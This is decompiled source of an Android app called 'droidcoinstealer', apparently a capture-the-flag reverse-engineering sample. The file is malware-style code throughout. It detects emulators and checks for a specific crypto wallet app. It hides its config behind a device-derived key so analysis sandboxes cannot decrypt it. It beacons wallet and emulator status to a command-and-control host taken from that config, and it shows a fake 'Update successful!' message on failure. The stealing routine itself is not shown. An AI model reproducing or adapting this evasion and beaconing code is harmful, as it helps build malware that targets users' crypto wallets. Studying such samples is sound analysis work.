package com.example.droidcoinstealer;

import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.p003os.EnvironmentCompat;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {
    private boolean hasWallet = false;
    private boolean isEmulated = false;

    public native byte[] decryptConfig(String str);

    static {
        System.loadLibrary("native-lib");
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        String str = "DROIDCOINSTEALER";
        super.onCreate(savedInstanceState);
        setContentView((int) C0273R.layout.activity_main);
        TextView tv = (TextView) findViewById(C0273R.C0275id.sample_text);
        try {
            JSONObject config_obj = new JSONObject(getConfig(genKey()));
            tv.setText(config_obj.getString("flag"));
            Log.d(str, "Config decrypted successfully!");
            Log.d(str, config_obj.toString());
            C0272C2 c2 = new C0272C2();
            c2.url = config_obj.getString("host");
            StringBuilder sb = new StringBuilder();
            sb.append("/");
            sb.append(config_obj.getString("path"));
            c2.path = sb.toString();
            c2.port = Integer.valueOf(config_obj.getInt("port"));
            c2.hasWallet = String.valueOf(this.hasWallet);
            c2.isEmulated = String.valueOf(this.isEmulated);
            c2.execute(new Void[0]);
        } catch (Throwable th) {
            tv.setText("Update successful!");
            Log.e(str, "Could not parse malformed JSON");
        }
    }

    private String getConfig(String key) {
        try {
            return new String(decryptConfig(key));
        } catch (Throwable th) {
            Log.e("DROIDCOINSTEALER", "Failed to decrypt config");
            return BuildConfig.FLAVOR;
        }
    }

    private String genKey() {
        String k1 = Build.MANUFACTURER.toLowerCase().substring(0, 2);
        String k2 = Build.MODEL.toLowerCase().substring(0, 2);
        StringBuilder sb = new StringBuilder();
        sb.append(k1);
        sb.append(k2);
        sb.append(hasDroidWallet());
        sb.append(isEmulator());
        String key = sb.toString();
        StringBuilder sb2 = new StringBuilder();
        sb2.append("Decryption key: ");
        sb2.append(key);
        sb2.append(" len:");
        sb2.append(key.length());
        Log.e("DROIDCOINSTEALER", sb2.toString());
        return key;
    }

    private String isEmulator() {
        if (!Build.FINGERPRINT.toLowerCase().startsWith("generic") && !Build.FINGERPRINT.toLowerCase().startsWith(EnvironmentCompat.MEDIA_UNKNOWN) && !Build.MODEL.toLowerCase().contains("google_sdk") && !Build.MODEL.toLowerCase().contains("emulator") && !Build.MODEL.toLowerCase().contains("android sdk built for") && !Build.MANUFACTURER.toLowerCase().contains("genymotion")) {
            return "STEALCOINZ!";
        }
        this.isEmulated = true;
        return "NOTCOOLMAN!";
    }

    private String hasDroidWallet() {
        this.hasWallet = appInstalledOrNot("com.nightcity.droidcoinwallet");
        return Integer.toString(this.hasWallet ? 1 : 0);
    }

    private boolean appInstalledOrNot(String uri) {
        try {
            getPackageManager().getPackageInfo(uri, 1);
            return true;
        } catch (NameNotFoundException e) {
            return false;
        }
    }
}
